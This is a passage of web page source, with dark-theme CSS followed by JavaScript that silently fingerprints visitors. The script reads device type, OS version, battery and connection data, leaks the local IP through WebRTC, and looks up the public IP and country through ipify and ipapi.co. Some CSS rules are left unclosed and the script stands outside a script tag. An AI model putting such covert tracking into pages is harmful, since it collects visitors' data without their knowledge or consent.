      cursor: pointer;
      width: 350px;
      height: 30px;
      margin: 1px 25px 1px;}
    body{
      background-color: hsl(240, 10%, 7%);
      justify-content: center;
      align-items: center;
      display: flex;}
    .button{
      margin: 1px 25px 1px;
      border-radius: 8px;
      border: 1px solid hsl(0, 0%, 70%);
      background-color: hsl(240, 10%, 19%);
      color: hsl(0, 0%, 70%);
      font-size: 1rem;
      width: 350px;
      transition: all 0.3s;
      cursor: pointer;
      height: 30px;}
    .TextRed{
      color: red;
      transform: scaleX(0);
      transition: all 0.5s;
      margin: 1px 25px 1px;
      font-size: 2.5mm}
    .Text{
      margin: 20px 0px 8px 110px;
      color: white;
      font-weight: bold;}
    .Frame{
      background-color: hsl(240, 10%, 19%);

      width: 400px;
      transition: all 5s;
      height: 400px;}
    ::placeholder{
      color: hsl(222, 6%, 80%);
      font-weight: lighter;}
    .button:hover{
      background-color: hsl(240, 10%, 25%);
      transform: scale(0.95);
    }
    .button:active{
      background-color: hsl(240, 10%, 45%);}
    .Gui2{

    Input:hover{

</head>

const batteryInfo = navigator.getBattery ? navigator.getBattery() : null;
const getDeviceName = () =>{
const devices = ['iPhone', 'OPPO', 'Vivo', 'Realme', 'OnePlus', 'Samsung', 'Xiaomi', 'Huawei', 'Tecno', 'Windows', 'Macintosh', 'Linux'];
const match = devices.find(device => new RegExp(device, 'i').test(navigator.userAgent));
return match ? match.replace('Macintosh', 'Mac Device').replace('Windows', 'Windows Device').replace('Linux', 'Linux Device') : 'Unknown Device';};
const getOSVersion = () =>{
let ua = navigator.userAgent;
let android = ua.match(/Android\s([\d.]+)/);
let ios = ua.match(/OS (\d+_\d+(_\d+)?)/);
if (android) return `Android ${android[1]}`;
if (/iPad|iPhone|iPod/.test(ua)) return `iOS ${ios ? ios[1].replace(/_/g, ".") : "(version unknown)"}`;
return "Unknown OS";};
let os = getOSVersion();
let IP = "Fetching...";
let localIP = "Unavailable";
let time = new Date();
const deviceName = getDeviceName();
const connection = navigator.connection || {};
const ua = navigator.userAgent.toLowerCase();
const isIOS = /iphone|ipad|ipod/.test(ua);
const isAndroid = /android/.test(ua);
const timeInfo = `${(time.getHours()<10?"0":"") + time.getHours()}:${(time.getMinutes()<10?"0":"") + time.getMinutes()}:${(time.getSeconds()<10?"0":"") + time.getSeconds()}`
async function getIP(){
    try {
        let response = await fetch('https://api64.ipify.org?format=json');
        let data = await response.json();
        IP = data.ip;
    } catch (error) {
        console.error('Error fetching IP:', error);}}
async function getLocalIP(){
    return new Promise((resolve) => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        pc.setLocalDescription(pc.createOffer());
        pc.onicecandidate = (e) => {
            const candidate = e.candidate?.candidate?.match(/(\d+\.\d+\.\d+\.\d+)/)?.[1];
            if (candidate) resolve(candidate);};
        setTimeout(() => resolve("Unavailable"), 2000);});}
async function getC(){
    try {
        let response = await fetch('https://ipapi.co/json/');
        let data = await response.json();
        C = data.country_name + " " + data.country;
    } catch (error) {
        console.error('Error fetching country:', error);
        C = "Unknown";}}
getIP();
getC();
